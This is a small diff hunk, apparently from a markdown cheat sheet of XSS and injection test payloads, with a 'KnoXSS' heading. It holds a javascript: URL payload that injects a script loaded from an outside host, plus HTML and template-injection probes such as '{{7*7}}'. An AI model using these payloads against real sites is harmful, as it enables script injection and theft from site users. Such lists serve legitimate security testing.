@@ -24,7 +24,7 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'//ixss.xyz\';d
 ';"/><h1>test{{7*7}}
 ```
 ```bash
-HTMLi<h1>HTMLi&gt;h1&lt;Test{{7*7}}[[7*7]]
+HTML<h1>HTML&gt;h1&lt;Test{{7*7}}[[7*7]]
 ```
 
 ## KnoXSS
